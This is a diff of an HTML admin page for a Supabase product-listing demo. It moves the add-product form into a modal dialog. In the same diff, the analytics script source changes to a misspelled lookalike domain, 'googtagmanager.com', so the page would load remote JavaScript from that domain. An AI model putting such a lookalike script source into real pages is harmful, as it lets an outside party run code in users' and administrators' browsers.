@@ -7,7 +7,7 @@
     <title>管理後台 - Supabase 實戰</title>
     <meta name="description" content="運用 Supabase 和 PostgreSQL 建立的商品列表與管理功能。">
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-TZ5HPBYDWV"></script>
+    <script async src="https://www.googtagmanager.com/gtag/js?id=G-TZ5HPBYDWV"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
@@ -55,24 +55,11 @@
 
         <main class="main-content">
             
-            <section id="add-product-section" style="margin-bottom: 30px;">
-                <h2>新增商品</h2>
-                <form id="add-product-form">
-                    <label for="product-name">商品名稱:</label>
-                    <input type="text" id="product-name" required><br>
-
-                    <label for="product-description">商品描述:</label>
-                    <textarea id="product-description"></textarea><br>
-
-                    <label for="product-price">商品價格:</label>
-                    <input type="number" id="product-price" required><br>
-
-                    <label for="product-image-url">商品圖片 URL:</label>
-                    <input type="url" id="product-image-url"><br>
-
-                    <button type="submit">新增商品</button>
-                </form>
-            </section>
+            <nav class="sub-nav">
+                <ul>
+                    <li><button id="open-add-modal-btn" class="nav-button"><b>[+] 新增商品</b></button></li>
+                </ul>
+            </nav>  
 
             
             <section id="products-list">
@@ -90,6 +77,29 @@
         <p>&copy; 以上專頁，由沈廷翼開發的Gemini Gem 輔助下完成</p>
         <p>&copy; 專頁伺服器採用Railway / 程式碼放置於Github / VS Code 編譯器</p>
     </footer>
+
+    
+    <div id="addProductModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2>新增商品</h2>
+            <form id="add-product-form">
+                <label for="product-name">商品名稱:</label>
+                <input type="text" id="product-name" required><br>
+
+                <label for="product-description">商品描述:</label>
+                <textarea id="product-description"></textarea><br>
+
+                <label for="product-price">商品價格:</label>
+                <input type="number" id="product-price" required><br>
+
+                <label for="product-image-url">商品圖片 URL:</label>
+                <input type="url" id="product-image-url"><br>
+
+                <button type="submit">新增商品</button>
+            </form>
+        </div>
+    </div>
 
     
     <div id="editProductModal" class="modal">
